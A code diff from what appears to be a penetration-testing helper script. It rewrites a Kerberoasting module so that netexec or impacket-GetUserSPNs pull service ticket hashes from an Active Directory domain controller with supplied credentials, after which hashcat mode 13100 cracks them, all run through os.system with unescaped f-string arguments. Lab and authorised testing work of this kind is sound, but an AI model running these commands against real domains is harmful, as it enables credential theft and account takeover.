@@ -75,7 +75,11 @@ Info:\t/
         else:
             cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --kerberoasting {outputfile}"
         cmd2 = f'hashcat -m 13100 {outputfile} {settings.WORDLIST}'
-        config.run_cmd([cmd1,cmd2])
+        config.log_cmd([cmd1,cmd2])
+        print(f'\033[96m[$]\033[0m {cmd1}')
+        os.system(cmd1)
+        print(f'\033[96m[$]\033[0m {cmd2}')
+        os.system(cmd2)
     elif user_input.lower() == "imp":
         config.required_creds(box)
         os.chdir(path.ws_atk)
@@ -92,7 +96,13 @@ Info:\t/
         else:
             cmd1 = f"impacket-GetUserSPNs -dc-host {box.fqdn} {box.domain}/{box.username}:{box.password} {opt}-outputfile {outputfile}"
         cmd2 = f'hashcat -m 13100 {outputfile} {settings.WORDLIST}'
-        config.run_cmd([cmd1,cmd2], {2:f'cat {outputfile}'}, {2:f'[*] Outputfile: {outputfile}'})
+        config.log_cmd([cmd1,cmd2])
+        print(f'\033[96m[$]\033[0m {cmd1}')
+        os.system(cmd1)
+        print(f'[*] Outputfile: {outputfile}')
+        os.system(f'cat {outputfile}')
+        print(f'\033[96m[$]\033[0m {cmd2}')
+        os.system(cmd2)
     else:
         print("\033[91m[!]\033[0m Incorrect input!")
         exit()
